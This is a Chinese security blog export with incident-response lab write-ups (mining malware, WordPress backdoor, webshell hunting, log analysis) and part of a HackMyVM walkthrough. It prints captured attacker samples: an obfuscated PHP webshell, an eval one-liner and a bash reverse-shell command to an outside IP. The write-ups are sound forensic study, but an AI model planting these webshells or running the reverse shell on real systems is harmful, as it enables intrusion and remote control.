<h4 id="分析黑客的挖矿程序的矿池域名-将黑客挖矿程序的矿池域名称作为-仅域名-FLAG-提交"><a href="#分析黑客的挖矿程序的矿池域名-将黑客挖矿程序的矿池域名称作为-仅域名-FLAG-提交" class="headerlink" title="分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;"></a>分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;</h4><p>思路是去黑客新增的用户目录下看看有什么，在桌面下发现“kuang”文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601143018.png" ></p>
<p>用工具反编译一下就能看到矿池域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;wakuang.zhigongshanfang.top&#125;</span><br></pre></td></tr></table></figure>

<h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><h4 id="请提交攻击者攻击成功的第一时间，格式：flag-YY-MM-DD-hh-mm-ss"><a href="#请提交攻击者攻击成功的第一时间，格式：flag-YY-MM-DD-hh-mm-ss" class="headerlink" title="请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}"></a>请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}</h4><p>先看日志，看nginx的日志</p>
<p>思路是看最早是什么时候出现302重定向，进入manage</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-06-01%2014.41.46.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023:04:29 22:45:23&#125;</span><br></pre></td></tr></table></figure>

<h4 id="请提交攻击者的浏览器版本-flag-Firgfox-2200"><a href="#请提交攻击者的浏览器版本-flag-Firgfox-2200" class="headerlink" title="请提交攻击者的浏览器版本 flag{Firgfox&#x2F;2200}"></a>请提交攻击者的浏览器版本 flag{Firgfox&#x2F;2200}</h4><p>上一道题可以看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Firefox/110.0&#125;</span><br></pre></td></tr></table></figure>

<h4 id="请提交攻击者目录扫描所使用的工具名称"><a href="#请提交攻击者目录扫描所使用的工具名称" class="headerlink" title="请提交攻击者目录扫描所使用的工具名称"></a>请提交攻击者目录扫描所使用的工具名称</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601144356.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Fuzz Faster U Fool&#125;</span><br></pre></td></tr></table></figure>

<h4 id="找到攻击者写入的恶意后门文件，提交文件名（完整路径）"><a href="#找到攻击者写入的恶意后门文件，提交文件名（完整路径）" class="headerlink" title="找到攻击者写入的恶意后门文件，提交文件名（完整路径）"></a>找到攻击者写入的恶意后门文件，提交文件名（完整路径）</h4><p>用D盾查杀一下，找到.x.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601145929.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601150123.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\.x.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）"><a href="#找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）" class="headerlink" title="找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）"></a>找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-06-01%2015.02.39.png" ></p>
<p>还是被D盾发现了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\usr\themes\default\post.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="请指出可疑进程采用的自动启动的方式，启动的脚本的名字-flag-1-exe"><a href="#请指出可疑进程采用的自动启动的方式，启动的脚本的名字-flag-1-exe" class="headerlink" title="请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}"></a>请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}</h4><p>windows目录下有个360.exe和x.bat（内容是”C:\Windows\360.exe”）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601150516.png" ></p>
<p>沙箱也能看到360.exe是木马</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601151153.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;x.bat&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi=0=DQeDsNOf1TKnq40ErD&alichlgref=https://www.google.com/" >https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi%3D0%3DDQeDsNOf1TKnq40ErD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>玄机--webshell查杀</title>
    <url>/2024/05/31/%E7%8E%84%E6%9C%BA-webshell%E6%9F%A5%E6%9D%80/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>护网要来了，好久没写博客了（滑跪）。前段时间朋友给了个号，做一波记录一下，一些语句和工具很值得学习。</p>
<h4 id="黑客webshell里面的flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx"><a href="#黑客webshell里面的flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx" class="headerlink" title="黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}"></a>黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</h4><p>先把html文件夹下的源码下载到本地</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -czvf src.tar.gz ./*</span><br></pre></td></tr></table></figure>

<p>然后用d盾查杀一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240531225522.png" ></p>
<p>查看gz.php，看到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;027ccd04-5065-48b6-a32d-77c704a5e26d&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客使用的什么工具的shell-github地址的md5-flag-md5"><a href="#黑客使用的什么工具的shell-github地址的md5-flag-md5" class="headerlink" title="黑客使用的什么工具的shell github地址的md5 flag{md5}"></a>黑客使用的什么工具的shell github地址的md5 flag{md5}</h4><p>gz.php看的出来用的是哥斯拉的木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla</span><br><span class="line">md5:39392de3218c333f794befef07ac9257</span><br></pre></td></tr></table></figure>

<h4 id="黑客隐藏shell的完整路径的md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xxx"><a href="#黑客隐藏shell的完整路径的md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xxx" class="headerlink" title="黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx"></a>黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</h4><p>D盾看到有一个.Mysqli.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/html/include/Db/.Mysqli.php</span><br><span class="line">md5:aebac0e58cd6c5fad1695ee4d1ac1919</span><br></pre></td></tr></table></figure>

<h4 id="黑客免杀马完整路径-md5-flag-md5"><a href="#黑客免杀马完整路径-md5-flag-md5" class="headerlink" title="黑客免杀马完整路径 md5 flag{md5}"></a>黑客免杀马完整路径 md5 flag{md5}</h4><p>d盾看到有一个top.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ERsDHgEUC1hI</span></span><br><span class="line"><span class="variable">$fun</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$fun</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$fun</span>[<span class="variable">$i</span>] = <span class="variable">$fun</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;s&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$s</span>.<span class="variable">$_GET</span>[<span class="string">&quot;func2&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$fun</span>);</span><br></pre></td></tr></table></figure>

<p>明显有混淆和编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">路径：/var/www/html/wap/top.php</span><br><span class="line">md5:eeff2eabfd9b7a6d26fc1a53d3f7d1de</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>玄机--日志分析</title>
    <url>/2024/05/31/%E7%8E%84%E6%9C%BA-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="linux日志分析"><a href="#linux日志分析" class="headerlink" title="linux日志分析"></a>linux日志分析</h3><h4 id="有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割"><a href="#有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割" class="headerlink" title="有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割"></a>有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr </span><br></pre></td></tr></table></figure>

<p>学一把这些语句</p>
<p><strong>grep</strong>把有”Failed password for root”的行挑出来，**-a**是将文件作为文本文件处理，避免某些情况下文件被识别为二进制文件</p>
<p><strong>awk</strong>把挑出来的行里第11个字段挑出来（按空格分），这里挑出那些ip地址</p>
<p><strong>sort</strong>把ip地址排序，**-n<strong>按数字排序，</strong>-r**降序排序</p>
<p><strong>uniq</strong>去重,<strong>-c</strong>输出中显示每个行重复出现的次数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 192.168.200.31</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2,192.168.200.32,192.168.200.31&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割"><a href="#ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割" class="headerlink" title="ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割"></a>ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log<span class="comment"># cat auth.log* | grep -a &quot;Accept&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span></span><br><span class="line">      2 192.168.200.2</span><br><span class="line">      1 202.78.166.217</span><br></pre></td></tr></table></figure>

<p>思路和上一道差不多，grep过滤的字段改成”Accept”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125; # 要删掉自己的ip</span><br></pre></td></tr></table></figure>

<h4 id="爆破用户名字典是什么？如果有多个使用”-”分割"><a href="#爆破用户名字典是什么？如果有多个使用”-”分割" class="headerlink" title="爆破用户名字典是什么？如果有多个使用”,”分割"></a>爆破用户名字典是什么？如果有多个使用”,”分割</h4><p>上题解</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password&quot; | perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;| uniq -c | sort -nr</span><br><span class="line">      5  invalid user user</span><br><span class="line">      5  invalid user hello</span><br><span class="line">      5  invalid user</span><br><span class="line">      4  root</span><br><span class="line">      1  root</span><br><span class="line">      1  root</span><br><span class="line">      1  invalid user test3</span><br><span class="line">      1  invalid user test2</span><br><span class="line">      1  invalid user test1</span><br></pre></td></tr></table></figure>

<p>对于这个perl比较陌生</p>
<p><strong>Perl</strong> 命令，用于从匹配的日志行中提取用户名。</p>
<p><code>while($_=&lt;&gt;)</code>逐行读取输入（即日志文件的内容）。</p>
<p><code> /for(.*?) from/</code>使用正则表达式匹配 for 和from 之间的内容（即用户名）。</p>
<p> <code>print &quot;$1\n&quot;;</code>打印匹配到的用户名（捕获组 <strong>$1</strong>）</p>
<p>思路就是用grep过滤后用perl -e处理每行语句，把for和from之间的字段（通常是用户名）挑出来**，再进行后续操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;user,hello,root,test3,test2,test1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="登陆成功的IP共爆破了多少次"><a href="#登陆成功的IP共爆破了多少次" class="headerlink" title="登陆成功的IP共爆破了多少次"></a>登陆成功的IP共爆破了多少次</h4><p>第一题的命令已经过滤出来了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 192.168.200.31</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;4&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客登陆主机后新建了一个后门用户，用户名是多少"><a href="#黑客登陆主机后新建了一个后门用户，用户名是多少" class="headerlink" title="黑客登陆主机后新建了一个后门用户，用户名是多少"></a>黑客登陆主机后新建了一个后门用户，用户名是多少</h4><p>可以直接看&#x2F;etc&#x2F;passwd，多了个test2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /etc/passwd</span><br><span class="line">...</span><br><span class="line">test2:x:1000:1000::/home/test2:/bin/sh</span><br><span class="line">debian:x:1001:1001:Debian:/home/debian:/bin/bash</span><br></pre></td></tr></table></figure>

<p>也可以</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log* | grep -a &quot;useradd&quot; | grep -a &quot;linux-rz&quot;</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new group: name=test2, GID=1000</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/sh</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;test2&#125;</span><br></pre></td></tr></table></figure>

<h3 id="apache日志分析"><a href="#apache日志分析" class="headerlink" title="apache日志分析"></a>apache日志分析</h3><h4 id="提交当天访问次数最多的IP，即黑客IP："><a href="#提交当天访问次数最多的IP，即黑客IP：" class="headerlink" title="提交当天访问次数最多的IP，即黑客IP："></a>提交当天访问次数最多的IP，即黑客IP：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat access.log.1 | grep &quot;03/Aug/2023:08:&quot; | awk &#x27;&#123;print $1&#125;&#x27; | sort | uniq -c | sort -nr | head -n 10</span><br><span class="line">   6555 192.168.200.2</span><br><span class="line">     29 ::1</span><br><span class="line">      5 192.168.200.38</span><br><span class="line">      1 192.168.200.48</span><br><span class="line">      1 192.168.200.211</span><br></pre></td></tr></table></figure>

<p>这次grep过滤的是”03&#x2F;Aug&#x2F;2023:08:”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客使用的浏览器指纹是什么，提交指纹的md5："><a href="#黑客使用的浏览器指纹是什么，提交指纹的md5：" class="headerlink" title="黑客使用的浏览器指纹是什么，提交指纹的md5："></a>黑客使用的浏览器指纹是什么，提交指纹的md5：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;192.168.200.2&quot; | awk -F&#x27;&quot;&#x27; &#x27;&#123;print $6&#125;&#x27; | uniq -c</span><br><span class="line">     12 Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">      1 curl/7.74.0</span><br><span class="line">   6543 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br></pre></td></tr></table></figure>

<p>直接grep上一题提取出来的ip</p>
<p>**awk -F’”‘ ‘{print $6}’**这里awk -F指定双引号为分割符，取第六个字段</p>
<blockquote>
<p>对于 Apache 访问日志，双引号内的字段通常是请求方法、URL、协议和 User-Agent 字符串。第六个字段通常是 User-Agent。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指纹：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">md5:2d6330f380f44ac20f3a02eed0958f66</span><br></pre></td></tr></table></figure>

<h4 id="查看index-php页面被访问的次数，提交次数："><a href="#查看index-php页面被访问的次数，提交次数：" class="headerlink" title="查看index.php页面被访问的次数，提交次数："></a>查看index.php页面被访问的次数，提交次数：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;/index.php&quot; | wc -l</span><br><span class="line">27</span><br></pre></td></tr></table></figure>

<p><strong>wc -l</strong>用于统计行数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;27&#125;</span><br></pre></td></tr></table></figure>

<h4 id="查看黑客IP访问了多少次，提交次数："><a href="#查看黑客IP访问了多少次，提交次数：" class="headerlink" title="查看黑客IP访问了多少次，提交次数："></a>查看黑客IP访问了多少次，提交次数：</h4><p>和上一题差不多</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &#x27;192.168.200.2 -&#x27; | wc -l</span><br><span class="line">6555</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;6555&#125;</span><br></pre></td></tr></table></figure>

<h4 id="查看2023年8月03日8时这一个小时内有多少IP访问，提交次数"><a href="#查看2023年8月03日8时这一个小时内有多少IP访问，提交次数" class="headerlink" title="查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:"></a>查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;03/Aug/2023:08&quot; | awk &#x27;&#123;print $1&#125;&#x27; | sort -nr | uniq -c</span><br><span class="line">      1 192.168.200.48</span><br><span class="line">      5 192.168.200.38</span><br><span class="line">      1 192.168.200.211</span><br><span class="line">   6555 192.168.200.2</span><br><span class="line">     29 ::1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5&#125;</span><br></pre></td></tr></table></figure>

<h3 id="mysql日志分析"><a href="#mysql日志分析" class="headerlink" title="mysql日志分析"></a>mysql日志分析</h3><h4 id="黑客第一次写入的shell-flag-关键字符串"><a href="#黑客第一次写入的shell-flag-关键字符串" class="headerlink" title="黑客第一次写入的shell flag{关键字符串}"></a>黑客第一次写入的shell flag{关键字符串}</h4><p>找到sh.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@xuanji:/var/www/html# cat sh.php</span><br><span class="line">1	2	&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;	4</span><br><span class="line">//ccfda79e-7aa1-4275-bc26-a6189eb9a20b</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ccfda79e-7aa1-4275-bc26-a6189eb9a20b&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客反弹shell的ip-flag-ip"><a href="#黑客反弹shell的ip-flag-ip" class="headerlink" title="黑客反弹shell的ip flag{ip}"></a>黑客反弹shell的ip flag{ip}</h4><p>在日志中发现adminer.php中存在sqk注入，用sys_eval实现命令执行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601005724.png" ></p>
<p>主要在&#x2F;tmp&#x2F;1.sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@xuanji:/var/log/apache2# cat /tmp/1.sh</span><br><span class="line">bash -i &gt;&amp;/dev/tcp/192.168.100.13/777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.100.13&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客提权文件的完整路径-md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xx"><a href="#黑客提权文件的完整路径-md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xx" class="headerlink" title="黑客提权文件的完整路径 md5 flag{md5} 注 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx"></a>黑客提权文件的完整路径 md5 flag{md5} 注 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx</h4><p>先猜测是udf提权，在common.php找到数据库连接的账号密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010114.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p334cc35b3c704593</span><br><span class="line">连接到数据库</span><br><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">看一下plugin设置的目录</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010309.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010328.png" ></p>
<p>有两个udf.so</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">路径：/usr/lib/mysql/plugin/udf.so</span><br><span class="line">md5:b1818bde4e310f3d23f1005185b973e7</span><br></pre></td></tr></table></figure>

<h4 id="黑客获取的权限-flag-whoami后的值"><a href="#黑客获取的权限-flag-whoami后的值" class="headerlink" title="黑客获取的权限 flag{whoami后的值}"></a>黑客获取的权限 flag{whoami后的值}</h4><p>udf提权后拿到的是mysql权限，所以：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;mysql&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi=0=DQeDsNOf1TKnq40ErD&alichlgref=https://www.google.com/" >https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi%3D0%3DDQeDsNOf1TKnq40ErD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm first 复盘</title>
    <url>/2024/03/15/new/index/</url>
    <content><![CDATA[<h4 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机ip 192.168.64.75</span><br><span class="line">攻击机ip 192.168.64.3</span><br></pre></td></tr></table></figure>

<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫描到3个端口，21端口，22端口和80端口</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2020.08.29.png"   alt="d" style="zoom:40%;" >

<p>80端口看不到什么内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.09.52.png" ></p>
<p>nmap扫出来ftp端口有几个文件夹，登陆看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp 192.168.64.75</span><br></pre></td></tr></table></figure>

<p>登陆账号密码都是ftp就行，看来看去只有first文件夹下面有个图片。下载出来</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.15.00.png" ></p>
<p>接着就使用<strong>stegseek</strong>工具分析一下，自动分析出一个secret.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ stegseek first.jpg</span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line"></span><br><span class="line">[i] Found passphrase: &quot;firstgurl1&quot;</span><br><span class="line">[i] Original filename: &quot;secret.txt&quot;.</span><br><span class="line">[i] Extracting to &quot;first.jpg.out&quot;.</span><br><span class="line">the file &quot;first.jpg.out&quot; does already exist. overwrite ? (y/n)</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat secret.txt</span><br><span class="line">SGkgSSBoYWQgdG8gY2hhbmdlIHRoZSBuYW1lIG9mIHRoZSB0b2RvIGxpc3QgYmVjb3VzZSBkaXJlY3RvcnkgYnVzdGluZyBpcyB0b28gZWFzeSB0aGVlc2UgZGF5cyBhbHNvIEkgZW5jb2RlZCB0aGlzIGluIGJlc2E2NCBiZWNvdXNlIGl0IGlzIGNvb2wgYnR3IHlvdXIgdG9kbyBsaXN0IGlzIDogMmYgNzQgMzAgNjQgMzAgNWYgNmMgMzEgNzMgNzQgNWYgNjYgMzAgNzIgNWYgNjYgMzEgNzIgMzUgNzQgZG8gaXQgcXVpY2sgd2UgYXJlIHZ1bG5hcmFibGUgZG8gdGhlIGZpcnN0IGZpcnN0IA==</span><br></pre></td></tr></table></figure>

<p>secret.txt里面是串base64字符，解密一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat secret.txt| base64 -d</span><br><span class="line">Hi I had to change the name of the todo list becouse directory busting is too easy theese days also I encoded this in besa64 becouse it is cool btw your todo list is : 2f 74 30 64 30 5f 6c 31 73 74 5f 66 30 72 5f 66 31 72 35 74 do it quick we are vulnarable do the first first</span><br></pre></td></tr></table></figure>

<p>注意看中间有一串十六机制数字，再解密一下，得到一个目录，访问一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.19.23.png" ></p>
<h4 id="第一个shell"><a href="#第一个shell" class="headerlink" title="第一个shell"></a>第一个shell</h4><p>注意到第二点提到有upload.php，扫一下目录试试</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.19.57.png" ></p>
<p>扫到一个uploads目录和一个upload.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.21.33.png" ></p>
<p>可以发现文件上传没有任何过滤，那直接上传一个一句话木马</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.22.48.png" ></p>
